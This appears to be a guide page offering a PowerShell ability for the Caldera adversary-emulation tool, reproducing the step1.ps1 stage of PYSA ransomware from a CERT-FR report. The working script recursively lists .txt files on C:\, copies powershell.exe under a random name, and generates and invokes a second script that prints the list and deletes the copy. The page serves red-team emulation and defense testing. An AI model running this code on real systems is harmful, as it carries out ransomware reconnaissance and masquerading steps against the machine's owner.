---
cover: >-
  https://images.unsplash.com/photo-1523961131990-5ea7c61b2107?crop=entropy&cs=srgb&fm=jpg&ixid=MnwxOTcwMjR8MHwxfHNlYXJjaHw2fHx0ZWNofGVufDB8fHx8MTY0ODQ0MDAzMQ&ixlib=rb-1.2.1&q=85
coverY: 0
---

# Emulate step1.ps1 from the PYSA Threat Intelligence Report

This is an additional ability you can try out! Please note: when running the code, you will have to remove the comments before putting this into Caldera. It will not run correctly otherwise.&#x20;

```
# This code is designed to emulate the step1.ps1 file from the PYSA Threat Intelligence Report:; # https://www.cert.ssi.gouv.fr/uploads/CERTFR-2020-CTI-003.pdf ;

# This line of code will go through the C:\ file path and collect all the .txt files that it can find and; # has the permissions for and outputs them to a file called “AllFiles.txt” which it will create.;
Get-ChildItem -Path C:\*.txt -Recurse -Force | Out-File -FilePath C:\Users\Public\AllFiles.txt;

#Create random name for the powershell.exe “EnNoB-” + random number;
[Int] $rand = Get-Random -Minimum 1000 -Maximum 9876;
$nName = "EnNoB-$rand";

# Here a copy of powershell is created and moved to the C:\Users\Public file path; 
Copy-Item "C:\Windows\\SysWOW64\WindowsPowerShell\v1.0\powershell.exe" -Destination "C:\Users\Public\$nName.exe";

#Here I had a hard time getting the step2.ps1 file to copy the variables over to the new file. This; #is a work-around that worked for me. By initializing the variables by their own name I was able; #to get them to copy to the step2.ps1 file.;
$file = "C:\Users\Public\step2.ps1";
$filePath = "$" + "filePath";
$allFiles = "$" + "allFiles";

#When these steps are copied to the step2.ps1 they will actually show up because they are; #initialized as their variable names. This part just puts the code of the step2.ps1 into a variable;
$steps = "param([String]$filePath,[String]$allFiles);"; 
$steps = $steps + " type $allFiles;";
$steps = $steps + " Remove-Item $filePath -Force;";

#Here the steps get output to the $file path (C:\Users\Public\step2.ps1) which will be created if it;  #is not found.;
$steps > $file;

# This initializes the parameters that step2 will take in, which are the file path to the; #powershell.exe file that was renamed randomly and the path to the AllFiles.txt file;
$params = '-filePath "C:\Users\Public\$nname" -allFiles "C:\Users\Public\AllFiles.txt" -Force';

# This step calls the step2.ps1 file and runs it with the given parameters;
Invoke-Expression "$file $params";

```

